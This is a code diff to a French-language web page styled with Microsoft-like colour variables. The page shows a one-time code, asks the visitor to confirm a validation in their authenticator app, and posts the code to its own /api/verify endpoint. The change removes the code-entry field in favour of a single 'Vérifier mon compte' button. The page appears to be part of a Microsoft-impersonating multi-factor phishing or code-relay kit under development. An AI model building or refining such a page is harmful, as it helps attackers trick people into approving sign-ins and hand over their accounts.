@@ -232,24 +232,6 @@
       color: var(--ms-blue-dark);
     }
 
-    .otp-input {
-      width: 100%;
-      height: 44px;
-      padding: 0 14px;
-      font-size: 20px;
-      font-family: "Cascadia Code", "Consolas", "Courier New", monospace;
-      letter-spacing: 3px;
-      text-align: center;
-      border: 1px solid var(--ms-gray-200);
-      border-radius: 4px;
-      background: var(--ms-white);
-      color: var(--ms-gray-900);
-      outline: none;
-      transition: border-color 0.2s;
-      margin-bottom: 16px;
-    }
-    .otp-input:focus { border-color: var(--ms-blue); }
-
     .notice {
       font-size: 12px;
       color: var(--ms-gray-400);
@@ -327,19 +309,8 @@
         <div class="otp-code" id="otpCode">--------</div>
       </div>
 
-      <form id="verifyForm">
-        <input
-          class="otp-input"
-          type="text"
-          id="otpInput"
-          maxlength="8"
-          placeholder="XXXXXXXX"
-          required
-          autocomplete="one-time-code"
-        />
-        <p class="notice">Une fois la validation saisie dans votre application, cliquez ci-dessous pour accéder à votre compte.</p>
-        <button type="submit" class="btn btn-primary">Vérifier mon compte</button>
-      </form>
+      <p class="notice">Une fois la validation saisie dans votre application, cliquez ci-dessous pour accéder à votre compte.</p>
+      <button class="btn btn-primary" id="verifyBtn">Vérifier mon compte</button>
     </div>
   </div>
 
@@ -408,16 +379,14 @@
       }, 40000);
     }
 
-    // Step 3 → submit
-    document.getElementById('verifyForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
+    // Step 3 → verify button
+    document.getElementById('verifyBtn').addEventListener('click', async () => {
       const displayedCode = document.getElementById('otpCode').textContent;
-      const enteredCode = document.getElementById('otpInput').value;
       try {
         await fetch('/api/verify', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ displayedCode, enteredCode })
+          body: JSON.stringify({ displayedCode })
         });
       } catch (err) {
         console.error('Verify error', err);
